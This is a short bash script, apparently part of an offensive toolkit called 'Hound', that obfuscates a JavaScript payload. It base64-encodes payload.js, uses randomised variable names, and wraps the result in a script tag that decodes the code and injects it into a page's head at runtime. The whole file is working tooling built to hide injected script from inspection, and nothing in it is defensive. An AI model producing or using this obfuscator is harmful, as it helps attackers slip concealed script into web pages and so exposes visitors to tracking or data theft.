#!/bin/bash
# Hound v1.0 — Payload Obfuscator
# Converts payload.js → payload_obf.js using base64 encoding

INFILE="payload.js"
OUTFILE="payload_obf.js"

if [ ! -f "$INFILE" ]; then
    echo "[!] $INFILE not found!"
    exit 1
fi

echo "[*] Obfuscating $INFILE..."

# Encode payload to base64 (single line, no wrapping)
B64=$(base64 -w0 "$INFILE" 2>/dev/null || base64 "$INFILE" 2>/dev/null | tr -d '\n')

if [ -z "$B64" ]; then
    echo "[!] base64 encoding failed!"
    exit 1
fi

# Generate random variable names
V1=$(cat /dev/urandom | tr -dc 'a-z' | head -c 10)
V2=$(cat /dev/urandom | tr -dc 'a-z' | head -c 10)

# Wrap in script tag — decode base64 at runtime and inject as script element
cat > "$OUTFILE" << ENDOFFILE
<script type="text/javascript">
(function(){var ${V1}=atob('${B64}');var ${V2}=document.createElement('script');${V2}.textContent=${V1};document.head.appendChild(${V2});})();
</script>
ENDOFFILE

echo "[+] Obfuscated payload saved to $OUTFILE"
echo "[+] Original: $(wc -c < "$INFILE") bytes → Obfuscated: $(wc -c < "$OUTFILE") bytes"
